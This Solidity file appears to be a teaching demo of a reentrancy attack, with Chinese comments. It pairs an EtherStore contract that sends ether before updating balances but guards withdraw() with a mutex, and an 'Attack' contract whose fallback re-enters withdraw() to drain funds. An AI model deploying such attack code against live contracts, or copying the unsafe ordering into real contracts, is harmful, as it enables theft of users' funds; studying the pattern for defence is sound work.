// SPDX-License-Identifier: MIT
pragma solidity ^0.8.13;

//被攻击合约
contract EtherStore {
    //记录余额
    mapping(address => uint256) public balance;

    //锁
    bool locked;

    //判断是否加锁，若加锁已返回，否则加锁，执行完释放锁
    modifier noLock() {
        require(!locked, "The lock is locked.");
        locked = true;
        _;
        locked = false;
    }

    // 存款，ether转入合约地址，同时更新调用者的balance;
    function deposit() external payable {
        balance[msg.sender] += msg.value;
    }

    // 取款，从合约地址余额向调用者地址取款
    function withdraw(uint256 _amount) noLock external {
        // 验证账户余额是否充足
        require(balance[msg.sender] >= _amount, "The balance is not sufficient.");
        // 取款（从合约地址转入调用者账户）
        (bool result,) = msg.sender.call{value: _amount}("");
        // 验证取款结果 
        require(result, "Failed to withdraw Ether");

        // 更新余额
        balance[msg.sender] -= _amount;
    }

    // 查看合约余额
    function getContractBalance() external view returns(uint256) {
        return address(this).balance;
    }
}

//攻击合约（黑客编写）
contract Attack {
    EtherStore public etherstore;

    constructor(address _etherStoreAddress) public {
        etherstore = EtherStore(_etherStoreAddress);
    }

    //回退函数
    fallback() external payable {
        //判断被攻击合约余额大于等于1 ether，是为了避免死循环，死循环时调用将会失败，达不到目的了
        if (address(etherstore).balance >= 1 ether) {
            //从被攻击合约中取款
            etherstore.withdraw(1 ether);
        } 
    }

    //攻击函数
    function attack() external payable {
        require(msg.value >= 1 ether);

        //向被攻击合约存款
        //etherstore.deposit.value(1 ether)();  //0.6.0版本以前写法
        etherstore.deposit{value: 1 ether}();
        //从被攻击合约中取款
        etherstore.withdraw(1 ether);
    }

    //查看合约余额
    function getContractBalance() external view returns (uint256) {
        return address(this).balance;
    }

    //取出合约余额到外部账户中
    function withdraw() external payable {
        payable(msg.sender).transfer(address(this).balance);
    }

    //查看外部账户余额
    function getExternalBalance() external view returns (uint256) {
        return msg.sender.balance;
    }
}